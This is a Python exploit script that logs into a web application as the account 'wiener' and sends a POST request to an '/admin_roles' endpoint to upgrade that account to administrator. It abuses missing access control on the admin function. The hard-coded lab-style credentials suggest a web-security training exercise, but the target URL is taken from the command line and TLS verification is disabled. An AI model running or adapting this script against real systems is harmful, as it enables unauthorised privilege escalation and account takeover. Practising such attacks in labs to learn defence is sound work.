# imports
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
# disabling warnings 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def upgrade_to_admin(s,url):
    # Login
    login_url = url + '/login'
    data_login = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False)
    res = r.text
    if 'Log out' in res:
        print("(+) Successfully Logged in as User")
        #Upgradeing the user to admin {*exploit*}
        print("(+) Attempting to upgrade User to Admin")
        upgrade_url = url+ "/admin_roles"
        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
        r = s.post(upgrade_url, data=data_upgrade, verify=False)
        if r.status_code == 200:
            print("(+) Successfully upgraded User to Admin")
        else:
            print("(-) Failed to upgrade user to Admin ")
            sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.session()
    url = sys.argv[1]
    upgrade_to_admin(s, url)

if __name__ == '__main__':
    main()
